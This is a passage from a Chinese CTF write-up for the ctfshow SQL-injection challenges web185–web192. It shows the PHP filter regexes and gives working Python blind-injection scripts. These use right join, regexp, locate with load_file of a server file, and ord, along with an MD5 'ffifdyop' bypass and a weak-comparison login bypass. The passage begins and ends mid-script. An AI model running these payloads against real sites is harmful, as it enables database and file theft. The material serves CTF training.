        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.3</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> response<span class="token punctuation">.</span>text<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"$user_count = 1;"</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>
            flag <span class="token operator">+=</span> x
            <span class="token keyword">break</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token comment"># print("[--] &#123;&#125; is wrong".format(x))</span>
            <span class="token keyword">continue</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[flag]:"</span> <span class="token operator">+</span> flag<span class="token punctuation">)</span>
</code></pre>

<p><strong>方法二</strong>：继续使用right join</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests


<span class="token keyword">def</span> <span class="token function">creatNum</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>
    res <span class="token operator">=</span> <span class="token string">"true"</span>
    <span class="token keyword">if</span> num <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> res
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>num<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            res <span class="token operator">+=</span> <span class="token string">"+true"</span>
    <span class="token keyword">return</span> res


url <span class="token operator">=</span> <span class="token string">'https://16d50b32-c89c-423e-aa09-841d997cb617.challenge.ctf.show/select-waf.php'</span>
flag <span class="token operator">=</span> <span class="token string">"ctfshow&#123;"</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">46</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
            <span class="token string">"tableName"</span><span class="token punctuation">:</span> <span class="token string">"ctfshow_user as a right join ctfshow_user as b on (substr(b.pass,&#123;&#125;,true)regexp(char(&#123;&#125;)))"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>
                creatNum<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span> creatNum<span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#125;</span>
        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>
        <span class="token keyword">if</span> response<span class="token punctuation">.</span>text<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"$user_count = 43;"</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span> <span class="token keyword">and</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token string">'.'</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>
            <span class="token keyword">break</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">continue</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre>

<h4 id="web186"><a href="#web186" class="headerlink" title="web186"></a>web186</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\%|\&lt;|\>|\^|\x00|\#|\x23|[0-9]|file|\=|or|\x7c|select|and|flag|into|where|\x26|\'|\"|union|\|sleep|benchmark/i'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span></code></pre>

<p>增加了尖括号，<code>^</code>、<code>%</code>的过滤。<br>上题的payload可用。</p>
<h4 id="web187-ffifdyop绕过md5"><a href="#web187-ffifdyop绕过md5" class="headerlink" title="web187(ffifdyop绕过md5)"></a>web187(ffifdyop绕过md5)</h4><p>查询语句</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//拼接sql语句查找指定ID用户</span>
  <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select count(*) from ctfshow_user where username = '<span class="token interpolation"><span class="token variable">$username</span></span>' and password= '<span class="token interpolation"><span class="token variable">$password</span></span>'"</span><span class="token punctuation">;</span>
      </code></pre>

<p>返回逻辑</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">//只有admin可以获得flag</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token operator">!=</span><span class="token string single-quoted-string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'用户名不存在'</span><span class="token punctuation">;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
  </code></pre>

<p><img src="web187.png" loading="lazy"></p>
<p><strong>ffifdyop||129581926211651571912466741651878684928</strong></p>
<p>经过md5加密后：276f722736c95d99e921722cf9ed621c</p>
<p>再转换为字符串：’or’6&lt;乱码&gt; 即  <code>&#39;or&#39;66�]��!r,��b</code></p>
<h4 id="web188-弱比较"><a href="#web188-弱比较" class="headerlink" title="web188(&#x3D;&#x3D;弱比较)"></a>web188(&#x3D;&#x3D;弱比较)</h4><p>返回逻辑</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//用户名检测</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/and|or|select|from|where|union|join|sleep|benchmark|,|\(|\)|\'|\"/i'</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'用户名非法'</span><span class="token punctuation">;</span>
  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">//密码检测</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'密码只能为数字'</span><span class="token punctuation">;</span>
  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">//密码判断</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pass'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'登陆成功'</span><span class="token punctuation">;</span>
    <span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag'</span><span class="token operator">=></span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
    </code></pre>

<p>payload是：<code>username=0 password=0</code></p>
<p>在比较查询的时候，查询语句为：<code>select pass from ctfshow_user where username = 0 and password = 0;</code>，由于<code>username password</code>是字符串，弱比较成了0,0&#x3D;0成立，所条件就成立了；最后查询语句就成了：<code>select pass from ctfshow_user where 1;</code></p>
<p>[<img src="web188.png" loading="lazy"></p>
<h4 id="web189-locate-load-file"><a href="#web189-locate-load-file" class="headerlink" title="web189(locate load_file)"></a>web189(locate load_file)</h4><p><strong>Hint</strong>：flag在api&#x2F;index.php文件中</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//用户名检测</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/select|and| |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\x26|\x7c|or|into|from|where|join|sleep|benchmark/i'</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'用户名非法'</span><span class="token punctuation">;</span>
  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">//密码检测</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'密码只能为数字'</span><span class="token punctuation">;</span>
  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">//密码判断</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pass'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'登陆成功'</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
   </code></pre>

<p>根据提示，先利用locate定位flag的位置，然后使用盲注来得到flag</p>
<blockquote>
<p>LOCATE(字符串1,字符串2)</p>
<p>返回字符串1在字符串2中第一次出现的位置，只要字符串2中包含字符串1，那么返回值必然大于0。</p>
</blockquote>
<blockquote>
<p>username&#x3D;0、password&#x3D;0时，返回“密码错误”。（说明存在用户，但是密码错误）<br>username&#x3D;1、password&#x3D;0时，返回“查询失败”。（说明用户不存在）</p>
</blockquote>
<p>可以利用以上返回情况来进行if逐字符盲注</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">'https://deb43701-a2f5-42bf-817a-f374b486bcdf.challenge.ctf.show/api/'</span>


<span class="token keyword">def</span> <span class="token function">getFlagIndex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    head <span class="token operator">=</span> <span class="token number">1</span>
    tail <span class="token operator">=</span> <span class="token number">300</span>
    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>
        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>
        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
            <span class="token string">"username"</span><span class="token punctuation">:</span> <span class="token string">"if(locate('ctfshow&#123;',"</span> <span class="token operator">+</span> <span class="token string">"load_file('/var/www/html/api/index.php'))>&#123;&#125;,0,1)"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>mid<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            <span class="token string">"password"</span><span class="token punctuation">:</span> <span class="token string">"1"</span>
        <span class="token punctuation">&#125;</span>
        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">"密码错误"</span> <span class="token operator">==</span> response<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            tail <span class="token operator">=</span> mid
    <span class="token keyword">return</span> mid


<span class="token keyword">def</span> <span class="token function">getFlag</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
    index <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span>
    flag <span class="token operator">=</span> <span class="token string">''</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> index <span class="token operator">+</span> <span class="token number">46</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        head <span class="token operator">=</span> <span class="token number">32</span>
        tail <span class="token operator">=</span> <span class="token number">127</span>
        <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>
            mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>
            data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
                <span class="token string">"username"</span><span class="token punctuation">:</span> <span class="token string">"if(ascii(substr(load_file('/var/www/html/api/index.php'),&#123;0&#125;,1))>&#123;1&#125;,0,1)"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>mid<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                <span class="token string">"password"</span><span class="token punctuation">:</span> <span class="token string">"1"</span>
            <span class="token punctuation">&#125;</span>
            response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>
            <span class="token keyword">if</span> <span class="token string">"密码错误"</span> <span class="token operator">==</span> response<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
                head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                tail <span class="token operator">=</span> mid
            <span class="token comment"># mid += 1</span>
        <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">break</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    mid <span class="token operator">=</span> getFlagIndex<span class="token punctuation">(</span><span class="token punctuation">)</span>
    getFlag<span class="token punctuation">(</span>mid<span class="token punctuation">)</span>
</code></pre>

<p>还有一个没有采用二分算法的</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> time

url <span class="token operator">=</span> <span class="token string">"http://dc02940d-e22b-4796-ab0f-04bdf57d3a9f.challenge.ctf.show/api/"</span>
flagstr <span class="token operator">=</span> <span class="token string">"&#125;&#123;&lt;>$=,;_ 'abcdefghijklmnopqr-stuvwxyz0123456789"</span>

flag <span class="token operator">=</span> <span class="token string">""</span>
<span class="token comment">#这个位置，是群主耗费很长时间跑出来的位置~</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">257</span><span class="token punctuation">,</span><span class="token number">257</span><span class="token operator">+</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
	<span class="token keyword">for</span> x <span class="token keyword">in</span> flagstr<span class="token punctuation">:</span>
		data<span class="token operator">=</span><span class="token punctuation">&#123;</span>
		<span class="token string">"username"</span><span class="token punctuation">:</span><span class="token string">"if(substr(load_file('/var/www/html/api/index.php'),&#123;&#125;,1)=('&#123;&#125;'),1,0)"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>x<span class="token punctuation">)</span><span class="token punctuation">,</span>
		<span class="token string">"password"</span><span class="token punctuation">:</span><span class="token string">"0"</span>
		<span class="token punctuation">&#125;</span>
		<span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>
		response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>
		time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.3</span><span class="token punctuation">)</span>
		<span class="token comment"># 8d25是username=1时的页面返回内容包含的，具体可以看上面的截图~</span>
		<span class="token keyword">if</span> response<span class="token punctuation">.</span>text<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"8d25"</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">:</span>
			<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"++++++++++++++++++ &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>
			flag<span class="token operator">+=</span>x
			<span class="token keyword">break</span>
		<span class="token keyword">else</span><span class="token punctuation">:</span>
			<span class="token keyword">continue</span>
	<span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
</code></pre>

<h4 id="web190-常规bool-blind"><a href="#web190-常规bool-blind" class="headerlink" title="web190(常规bool blind)"></a>web190(常规bool blind)</h4><p>输入 admin&#x2F;123 输出密码错误</p>
<p>输入 test&#x2F;123 输出用户名不存在</p>
<p>说明存在账号 admin</p>
<hr>
<p>输入 admin’ and 1&#x3D;1 # 输出密码错误</p>
<p>输入 admin’ and 1&#x3D;2 # 输出用户名不存在</p>
<p>说明存在布尔盲注的条件</p>
<hr>
<p>pass 长度为5 值为 admin</p>
<p>admin’ and length(pass) &#x3D; 5 #</p>
<p>admin’ and pass &#x3D; ‘admin’ #</p>
<p>说明 flag 并不是 pass 的值</p>
<p>接下来就是正常的盲注</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">'https://55202cb2-6c46-4248-a593-31a004489e2a.challenge.ctf.show/api/'</span>
flag <span class="token operator">=</span> <span class="token string">''</span>
i <span class="token operator">=</span> <span class="token number">0</span>
<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    head <span class="token operator">=</span> <span class="token number">32</span>
    tail <span class="token operator">=</span> <span class="token number">127</span>
    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>
    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>
        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>
        <span class="token comment"># 查数据库  ctfshow_fl0g,ctfshow_user</span>
        <span class="token comment"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span>
        <span class="token comment"># 查字段  id,f1ag</span>
        <span class="token comment"># payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_fl0g'"</span>
        <span class="token comment"># getFlag</span>
        payload <span class="token operator">=</span> <span class="token string">"select f1ag from ctfshow_fl0g"</span>
        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
            <span class="token string">"username"</span><span class="token punctuation">:</span> <span class="token string">"admin' and if(ascii(substr((&#123;0&#125;),&#123;1&#125;,1))>&#123;2&#125;,1,2)='1"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> i<span class="token punctuation">,</span> mid<span class="token punctuation">)</span><span class="token punctuation">,</span>
            <span class="token string">"password"</span><span class="token punctuation">:</span> <span class="token string">"1"</span>
        <span class="token punctuation">&#125;</span>
        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>
        <span class="token keyword">if</span> response<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"密码错误"</span><span class="token punctuation">:</span>
            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            tail <span class="token operator">=</span> mid
    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>
        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">break</span>
</code></pre>

<h4 id="web191-ord"><a href="#web191-ord" class="headerlink" title="web191(ord)"></a>web191(ord)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//TODO:感觉少了个啥，奇怪</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/file|into|ascii/i'</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'用户名非法'</span><span class="token punctuation">;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span></code></pre>

<p>ban了ascii，可以使用ord</p>
<h4 id="web192-regexp"><a href="#web192-regexp" class="headerlink" title="web192(regexp)"></a>web192(regexp)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//TODO:感觉少了个啥，奇怪</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/file|into|ascii|ord|hex/i'</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
      <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'用户名非法'</span><span class="token punctuation">;</span>
      <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span></code></pre>

<p><code>ord</code> <code>hex</code>都被ban了</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> string

url <span class="token operator">=</span> <span class="token string">'https://672395a7-518e-4be5-b990-8af1ef5202c4.challenge.ctf.show/api/'</span>
flagstr <span class="token operator">=</span> <span class="token string">" _&#123;&#125;-"</span> <span class="token operator">+</span> string<span class="token punctuation">.</span>ascii_lowercase <span class="token operator">+</span> string<span class="token punctuation">.</span>digits
flag <span class="token operator">=</span> <span class="token string">''</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">46</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> flagstr<span class="token punctuation">:</span>
        <span class="token comment"># 查数据库  ctfshow_fl0g,ctfshow_user</span>
        <span class="token comment"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span>
        <span class="token comment"># 查字段  id,f1ag</span>
        <span class="token comment"># payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_fl0g'"</span>
        <span class="token comment"># getFlag</span>
        payload <span class="token operator">=</span> <span class="token string">"select group_concat(f1ag) from ctfshow_fl0g"</span>
        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
            <span class="token string">"username"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"admin' and if(substr((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1)regexp('</span><span class="token interpolation"><span class="token punctuation">&#123;</span>j<span class="token punctuation">&#125;</span></span><span class="token string">'),1,2)='1"</span></span><span class="token punctuation">,</span>
            <span class="token string">"password"</span><span class="token punctuation">:</span> <span class="token number">1</span>
        <span class="token punctuation">&#125;</span>
        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>
        <span class="token keyword">if</span> response<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"密码错误"</span><span class="token punctuation">:</span>
